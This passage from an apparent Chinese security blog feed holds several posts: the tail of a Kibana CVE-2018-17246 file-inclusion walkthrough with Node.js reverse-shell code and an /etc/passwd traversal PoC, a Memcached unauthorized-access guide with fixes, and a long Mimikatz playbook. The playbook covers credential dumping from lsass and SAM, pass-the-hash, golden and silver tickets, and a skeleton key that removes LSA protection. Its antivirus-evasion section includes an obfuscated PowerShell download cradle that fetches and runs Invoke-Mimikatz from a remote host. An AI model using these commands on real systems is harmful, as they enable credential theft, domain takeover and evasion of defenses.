class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="regexp">/a/</span>;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>



<p>将本地创建的文件复制到kibana镜像中的&#x2F;tmp&#x2F;shell.js文件</p>
<p>命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp 你的文件路径 容器长ID:docker容器路径</span><br></pre></td></tr></table></figure>

<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125144232155.png" class title="image-20211125144232155">



<p>进入kibana控制台命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose  exec   kibana  bash</span><br></pre></td></tr></table></figure>

<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125142646488.png" class title="image-20211125142646488">



<p>可以看到复制文件成功</p>
<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125144306987.png" class title="image-20211125144306987">



<p>在浏览器中访问创建的shell.js文件</p>
<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125144616545.png" class title="image-20211125144616545">



<p>文件包含成功，js语句执行成功，反弹shell</p>
<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125144839807.png" class title="image-20211125144839807">



<h2 id="漏洞poc"><a href="#漏洞poc" class="headerlink" title="漏洞poc"></a>漏洞poc</h2><p>xray-poc:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name: poc-yaml-kibana-cve-2018-17246</span><br><span class="line">rules:</span><br><span class="line">  - method: GET</span><br><span class="line">    path: /api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../etc/passwd</span><br><span class="line">    follow_redirects: false</span><br><span class="line">    expression: |</span><br><span class="line">      response.headers[&quot;kbn-name&quot;] == &quot;kibana&quot; &amp;&amp; response.content_type.contains(&quot;application/json&quot;) &amp;&amp; response.body.bcontains(bytes(&quot;\&quot;statusCode\&quot;:500&quot;)) &amp;&amp; response.body.bcontains(bytes(&quot;\&quot;message\&quot;:\&quot;An internal server error occurred\&quot;&quot;))</span><br><span class="line">detail:</span><br><span class="line">  author: canc3s(https://github.com/canc3s)</span><br><span class="line">  kibana_version: before 6.4.3 and 5.6.13</span><br><span class="line">  links:</span><br><span class="line">    - https://nvd.nist.gov/vuln/detail/CVE-2018-17246</span><br><span class="line">    - https://github.com/vulhub/vulhub/blob/master/kibana/CVE-2018-17246/README.md</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/qq_27295403/article/details/100579631">(44条消息) 完美拷贝本地文件到docker容器_大唐锦绣的博客-CSDN博客_拷贝文件到docker容器</a></p>
<p><a href="https://blog.csdn.net/nzjdsds/article/details/119039751">(44条消息) Kibana本地文件包含漏洞（CVE-2018-17246）_大方子-CSDN博客</a></p>
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>Web应用漏洞</category>
        <category>Kibana</category>
      </categories>
      <tags>
        <tag>-web应用漏洞 - Kibana -命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>Memcached 未授权访问漏洞</title>
    <url>/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="Memcached-未授权访问漏洞CVE-2013-7239"><a href="#Memcached-未授权访问漏洞CVE-2013-7239" class="headerlink" title="Memcached 未授权访问漏洞CVE-2013-7239"></a><strong>Memcached 未授权访问漏洞CVE-2013-7239</strong></h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>(1) 漏洞简述Memcached 是一套分布式高速缓存系统。它以 Key - Value<br>的形式将数据存储在内存中。这些数据通常是会被频繁地应用、读取的。正因为内存中数据的读取速度远远大于硬盘的读取速度所以可以用来加速应用的访问。由于<br>Memcached 的安全设计缺陷客户端连接 Memcached<br>服务器后无需认证就可读取、修改服务器缓存内容。</p>
<p>(2) 风险等级高风险。</p>
<p>(3) 漏洞编号CVE-2013-7239 。</p>
<p>(4) 影响范围Memcached 全版本。</p>
<h2 id="安装-Memcached"><a href="#安装-Memcached" class="headerlink" title="安装 Memcached"></a>安装 Memcached</h2><p>Linux系统安装memcached，首先要先安装libevent库。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libevent ibevent-dev     </span><br><span class="line">自动下载安装（Ubuntu/Debian）</span><br><span class="line"></span><br><span class="line">yum install libevent libevent-devel</span><br><span class="line">自动下载安装（Redhat/Fedora/Centos）</span><br></pre></td></tr></table></figure>



<h2 id="自动安装"><a href="#自动安装" class="headerlink" title="自动安装"></a>自动安装</h2><p><strong>Ubuntu&#x2F;Debian</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install memcached</span><br></pre></td></tr></table></figure>

<p><strong>Redhat&#x2F;Fedora&#x2F;Centos</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install memcached</span><br></pre></td></tr></table></figure>

<p><strong>FreeBSD</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">portmaster databases/memcached</span><br></pre></td></tr></table></figure>



<p>安装完后可以使用 whereis 查看命令的路径：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whereis memcached</span><br></pre></td></tr></table></figure>



<p>安装完成后，启动Mecached</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令: /usr/bin/memcached  -u root -p 11211 -m 64m -vv</span><br></pre></td></tr></table></figure>

<img src="/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/77972532663466b685d87df4f73addb5.png" class>



<p>使用netstat -an | more查看端口监听情况，回显0.0.0.0:<strong>11211</strong>表示在所有网卡进行监听</p>
<img src="/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/1b48f94a16e35db707079e0508b68384.png" class>



<p>使用telnet连接11211端口，没有使用账号密码登录登陆成功</p>
<img src="/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/8888a9b284940445c4e06401f7c9219b.png" class>



<h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>(1)配置访问控制。建议用户不要将服务发布到互联网上以防被黑客利用而可以通过安全组规则或<br>Iptables 配置访问控制规则只允许内部必需的用户地址访问命令如下 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp  -s  xxx.xxx.xxx.xxx  --dport  11211  -j ACCEPT</span><br></pre></td></tr></table></figure>



<p>(2) bind 指定监听 IP。如果 Memcached 没有在外网开放的必要可在 Memcached<br>启动时指定绑定的 IP 地址为 127.0.0.1。例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P</span><br><span class="line">/tmp/memcached.pid</span><br></pre></td></tr></table></figure>



<p>(3) 最小化权限运行。使用普通权限账号运行以下指定 memcached 用户运行 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P</span><br><span class="line">/tmp/memcached.pid</span><br></pre></td></tr></table></figure>



<p>(4) 修改默认端口。修改默认 11211 监听端口为 11222 端口 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P</span><br><span class="line">/tmp/memcached.pid</span><br></pre></td></tr></table></figure>



<p>(5) 备份数据。为避免数据丢失升级前应做好备份或建立硬盘快照。</p>
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>未授权访问</category>
      </categories>
      <tags>
        <tag>-Web漏洞 -未授权访问 -Memcached</tag>
      </tags>
  </entry>
  <entry>
    <title>Mimikatz运行姿势</title>
    <url>/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/</url>
    <content><![CDATA[<h1 id="Mimikatz运行姿势"><a href="#Mimikatz运行姿势" class="headerlink" title="Mimikatz运行姿势"></a>Mimikatz运行姿势</h1><hr>
<p>上篇文章记录了Mimikatz神器的基本命令和很多模块的使用方法命令。由于在实际环境中可能会产生不同的问题，这篇文章记录学习Mimikatz工具的使用姿势和一些免杀方法。</p>
<h2 id="获取本地账户密码"><a href="#获取本地账户密码" class="headerlink" title="获取本地账户密码"></a>获取本地账户密码</h2><hr>
<h3 id="本地执行"><a href="#本地执行" class="headerlink" title="本地执行"></a>本地执行</h3><p>首先将执行权限提升为debug权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></figure>

<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103103351984.png" class title="image-20211103103351984">



<p>使用sekurlsa模块抓取明文密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103103420451.png" class title="image-20211103103420451">



<p>注:当目标为win10或2012R2以上时，默认禁止在内存中保存明文密码，但可以通过修改注册表的方式来抓取明文。</p>
<p>修改命令如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\Sec urityProviders\WDigest  /v UseLogonCredential /t REG_DWORD  /d  1  /f</span><br></pre></td></tr></table></figure>

<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103105046333.png" class title="image-20211103105046333">



<h3 id="SAM表离线获取hash"><a href="#SAM表离线获取hash" class="headerlink" title="SAM表离线获取hash"></a>SAM表离线获取hash</h3><p>导出SAM数据库的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg  save  HKLM\SYSTEM  SYSTEM(自定义名称)</span><br><span class="line"></span><br><span class="line">reg  save  HKLM\SAM SAM(自定义名称)</span><br></pre></td></tr></table></figure>

<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103110249663.png" class title="image-20211103110249663">



<p>提取导出SAM数据中的hash(确保Mimikatz和导出文件在同一目录下或者指定SAM数据的绝对&#x2F;相对路径)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::sam /sam:SAM(自定义名称)  /system:SYSTEM(自定义名称)</span><br></pre></td></tr></table></figure>

<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103110638898.png" class title="image-20211103110638898">



<h2 id="Procdump-Mimikatz"><a href="#Procdump-Mimikatz" class="headerlink" title="Procdump+Mimikatz"></a>Procdump+Mimikatz</h2><hr>
<p>当mimikatz无法在目标主机上正常运行时，可以使用微软提供的工具Procdump导出lsass.exe进程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">procsump64.exe -accepteula -ma lsass.exe  lsass.tmp</span><br></pre></td></tr></table></figure>

<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103111347692.png" class title="image-20211103111347692">



<p>使用 mimikatz的sekurlsa模块对导出的lsass.dmp文件。先使用minidump恢复到lsass.exe的状态，然后使用logonpasswords导出明文密码信息</p>
<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103113844380.png" class title="image-20211103113844380">



<p>可看到passwords.txt文档中系统的明文密码信息</p>
<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103115851943.png" class title="image-20211103115851943">



<h2 id="哈希传递攻击PTH"><a href="#哈希传递攻击PTH" class="headerlink" title="哈希传递攻击PTH"></a>哈希传递攻击PTH</h2><hr>
<h3 id="工作组环境"><a href="#工作组环境" class="headerlink" title="工作组环境"></a>工作组环境</h3><p>当我们获取到某一台主机中用户的NTLM哈希值时，可以直接将获取到的NTLM哈希值登录目标主机</p>
<p>命令；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa:pt /user:用户名   /domain:ip地址    /ntlm:用户的ntlm哈希值</span><br></pre></td></tr></table></figure>

<p>如下所示，我们可以直接登录目标主机cmd管理窗口，执行命令</p>
<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103130911394.png" class title="image-20211103130911394">

<p>注：只能在 mimikatz 弹出的 cmd 窗口才可以执行这些操作，注入成功后，可以使用psexec、wmic、wmiexec等实现远程执行命令</p>
<h3 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h3><p>在域环境下，如果获取到某一用户的ntlm哈希值，可以在域环境下任意主机登录用户，若获取到域控 管理员的账号和ntlm哈希值即可 登录域控。</p>
<p>命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa:pth  /user:用户  /domain:&quot;域名&quot;  /ntlm:用户ntlm哈希值</span><br></pre></td></tr></table></figure>



<h2 id="票据传递攻击"><a href="#票据传递攻击" class="headerlink" title="票据传递攻击"></a>票据传递攻击</h2><hr>
<h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>在域环境下，每个用户的ticcket都是由krbtgt的密码NTLM哈希进行加密传输的，只要获取到krbtgt用户的密码NTLM哈希值就可以随意伪造Ticket，从而使用Ticket登录域控，使用krbtgt用户密码HTLM哈希生成的票据为黄金票据</p>
<p>首先获取krbtft用户的NTLM哈希值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz  &quot;lsamdump::dcsync  /domain:xxx.com  /user:krbtgt&quot;</span><br></pre></td></tr></table></figure>



<p>利用mimikatz生成域管理员权限的黄金票据，输入域管理员对应的账号，域名称和sid值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:xxx.COM /sid:管理员SID值 /krbtgt:krbtgt用户的哈希值 /ticket:test.kiribi(生成的票据)</span><br></pre></td></tr></table></figure>



<p>导出上面生成的票据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt  test.kiribi</span><br></pre></td></tr></table></figure>



<p>查看导入后获取的域管权限，查看主机的目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir  \\$DC$.xxx.com\c$</span><br></pre></td></tr></table></figure>



<h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>白银票据是伪造 TGS(票据授权服务)，只能访问指定的服务，由客户端计算机账号的NTLM哈希值进行加密。</p>
<p>下面使用白银票据伪造CIFS(用于Windows主机之间进行网络文件共享)服务权限</p>
<p>提升权限，获取主机账号的哈希值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103161547663.png" class title="image-20211103161547663">

<p>这里的liukaifeng01的SID为S-1-5-21-295270202-1353902439-2381782089(不要后面的-1000)</p>
<p>伪造的OWA的NTLM哈希为84883cf100e1f84e2a2468f08d6d0e4f</p>
<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103162043108.png" class title="image-20211103162043108">



<p>生成白银票据命令 :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /domain:[domain] /sid:[SID] /target:服务用户.xxx.com /rc4:[server&#x27;s Hash] /service:[service] /user:[username] /ptt</span><br></pre></td></tr></table></figure>



<p>如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /domain:GOD /sid:S-1-5-21-295270202-1353902439-2381782089( /target:OWA.GOD.com /rc4:84883cf100e1f84e2a2468f08d6d0e4f /service:cifs /user:liukaifeng01 /ptt</span><br></pre></td></tr></table></figure>

<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103162850526.png" class title="image-20211103162850526">

<p>可以看到此时的liukaifeng01的key变成了OWA的，服务为cifs，生成了获取cifs的白银票据</p>
<p>伪造白银票据后，我们就可以远程访问DC</p>
<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103163128580.png" class title="image-20211103163128580">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注:若使用dir \\主机名\c$不能访问，则输入主机全名dir \\主机名.域名.com\c$</span><br></pre></td></tr></table></figure>



<h3 id="万能密钥"><a href="#万能密钥" class="headerlink" title="万能密钥"></a>万能密钥</h3><p>skeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户 都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对 lsass.exe 进行注 入，所以重启后会失效</p>
<p>在域控上安装skeleton key</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;misc::skeleton&quot;</span><br></pre></td></tr></table></figure>

<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103171351475.png" class title="image-20211103171351475">



<p>在域内其他机器使用skeleton key去访问域控，添加密码围殴mimikatz</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net  use   \\主机名.xxx.com\c$  mimikatz(密码)  /user:adtest \administrator</span><br></pre></td></tr></table></figure>



<p>微软在 2014 年 3 月 12 日添加了 LSA 爆护策略，用来防止对进程 lsass.exe 的代码注入。如果直接尝试添加 skelenton key 会失败。</p>
<p>但mimikatz依然可以绕过，需要导入mimidrv.sys文件，命令如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">!+</span><br><span class="line">!processprotect /process:lsass.exe /remove </span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure>

<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103172059633.png" class title="image-20211103172059633">



<h2 id="免杀处理"><a href="#免杀处理" class="headerlink" title="免杀处理"></a>免杀处理</h2><hr>
<h3 id="Invoke-Mimikatz"><a href="#Invoke-Mimikatz" class="headerlink" title="Invoke-Mimikatz"></a>Invoke-Mimikatz</h3><p>在powershell中导入invoke-Mimikatz.ps1，加载mimikatz模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass “import-module .Invoke-Mimikatz.ps1”</span><br></pre></td></tr></table></figure>

<p>运行mimikazt模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass “invoke-Mimikatz”</span><br></pre></td></tr></table></figure>

<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103194723187.png" class title="image-20211103194723187">

<p>在cmd中运行过程中没有被拦截</p>
<p>使用poweshell加载远程服务器的ps脚本，会被360拦截</p>
<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200143717.png" class title="image-20211103200143717">



<p>稍微做了简单的混淆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -c &quot; (&#x27;IEX &#x27;+&#x27;(Ne&#x27;+&#x27;w-O&#x27;+&#x27;bject Ne&#x27;+&#x27;t.W&#x27;+&#x27;ebClien&#x27;+&#x27;t).Do&#x27;+&#x27;wnloadS&#x27;+&#x27;trin&#x27;+&#x27;g&#x27;+&#x27;(&#x27;+&#x27;1vchttp://&#x27;+&#x27;192.168.211&#x27;+&#x27;.1/&#x27;+&#x27;Inv&#x27;+&#x27;oke-Mimik&#x27;+&#x27;a&#x27;+&#x27;tz.&#x27;+&#x27;ps11v&#x27;+&#x27;c)&#x27;+&#x27;;&#x27;+&#x27;I&#x27;+&#x27;nvoke-Mimika&#x27;+&#x27;tz&#x27;).REplaCE(&#x27;1vc&#x27;,[STRing][CHAR]39)|IeX&quot;</span><br></pre></td></tr></table></figure>

<p>还是被拦截</p>
<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200627835.png" class title="image-20211103200627835">

<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200702681.png" class title="image-20211103200702681">



<p>所以最好将Invoke-Mimikatz.ps1文件放置在目标主机上执行powershell加载模块运行imikatz</p>
<h3 id="使用-net2-0"><a href="#使用-net2-0" class="headerlink" title="使用.net2.0"></a>使用.net2.0</h3><p>首先下载<a href="https://raw.githubusercontent.com/ssssanr/Mimikatz-Csharp/master/katz.cs">katz.cs</a>，将katz.cs文件保存到本地</p>
<p>并放在对应的系统版本的Framework目录中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">32位：C:\Windows\Microsoft.NET\Framework\v2.0.50727</span><br><span class="line">64位：C:\Windows\Microsoft.NET\Framework64\v2.0.50727</span><br></pre></td></tr></table></figure>



<p>然后在powershell中执行命令生成key.snk</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$key=&#x27;BwIA AAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z 6 4cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5cl HIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4=&#x27;</span><br><span class="line"></span><br><span class="line">$Content = [System.Convert]::FromBase64String($key)</span><br><span class="line"></span><br><span class="line">Set-Content key.snk -Value $Content -Encoding Byte</span><br></pre></td></tr></table></figure>

<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103202206247.png" class title="image-20211103202206247">



<p>最后生成mimikatz，在运行mimikatz</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">32位:</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt;.\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt;.\regsvcs.exe katz.exe</span><br><span class="line"></span><br><span class="line">64位:</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v2.0.5072 7&gt;.\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;.\regsvcs.exe katz.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>在运行时被360发现啦，火绒没有反应</p>
<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103202433218.png" class title="image-20211103202433218">



<h3 id="使用-net4-0"><a href="#使用-net4-0" class="headerlink" title="使用.net4.0"></a>使用.net4.0</h3><p>下载[mimikatz.xml](<a href="https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes">https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes</a> mimikatz.xml)，将其保存在Framework64文件下的v4,0文件下并运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msbuild.exe mimikatz.xml</span><br></pre></td></tr></table></figure>

<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103203026847.png" class title="image-20211103203026847">

<p>360和火绒都没有报毒和进行拦截</p>
<h3 id="js加载mimikatz"><a href="#js加载mimikatz" class="headerlink" title="js加载mimikatz"></a>js加载mimikatz</h3><p>下载<a href="https://gist.github.com/500646/14051b27b45dce37818aca915e93062f/raw/2adcc9d2570b4367c6cc405e5a5969863d04fc9b/katz.js">katz.js</a>，执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scsript mimikatz.js</span><br></pre></td></tr></table></figure>

<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204511543.png" class title="image-20211103204511543">



<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204537821.png" class title="image-20211103204537821">

<p>360拦截了，火绒没绕过</p>
<h3 id="jscript的xsl版"><a href="#jscript的xsl版" class="headerlink" title="jscript的xsl版"></a>jscript的xsl版</h3><p>本地加载mimikatz.xsl文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic os get /format:&quot;mimikatz.xsl&quot;</span><br></pre></td></tr></table></figure>

<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204250467.png" class title="image-20211103204250467">

<p>360和火绒都没有拦截</p>
<h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><hr>
<h3 id="导出chrome中的密码"><a href="#导出chrome中的密码" class="headerlink" title="导出chrome中的密码"></a>导出chrome中的密码</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzOTg0NjYzNg==&mid=2247483949&idx=1&sn=db4853c88e4bf0a550c095d9017a363c&chksm=e92297aede551eb815a604ba944c4666b260c5bfe044e1b3a60946b586fd5679e29db0adf18d&mpshare=1&scene=23&srcid=&sharer_sharetime=1582350092849&sharer_shareid=d32981e13d51bf06188894426d2a54e5#rd">使用mimikatz导出chrome中的密码 (qq.com)</a></p>
<h3 id="隐藏功能"><a href="#隐藏功能" class="headerlink" title="隐藏功能"></a>隐藏功能</h3><p>管理员常常会禁用一些重要程序的运行，比如cmd、regedit、taskmgr，此时不方便渗透的进一步进行，这里除了去改回原来的配置，还可以借助mimikatz的一些功能：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Copyprivilege::debug</span><br><span class="line">misc::cmd</span><br><span class="line">misc::regedit</span><br><span class="line">misc::taskmgr</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>内网渗透</category>
        <category>渗透工具</category>
      </categories>
      <tags>
        <tag>-内网渗透 -工具使用 -免杀处理</tag>
      </tags>
  </entry>
  <entry>
    <title>MSSQL注入学习</title>
    <url>/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="MSSQL注入学习"><a href="#MSSQL注入学习" class="headerlink" title="MSSQL注入学习"></a>MSSQL注入学习</h1><p>对于SQL注入来说，之前只在项目中接触过MYSQL和Postgresql注入，这次记录下前辈在某系统后台挖掘的MSSQL注入。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>MSSQL，指的是MSSQL是指微软的SQL Server数据库服务器，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。属<a href="https://cloud.tencent.com/product/cdb-overview?from=10680">关系型数据库</a></p>
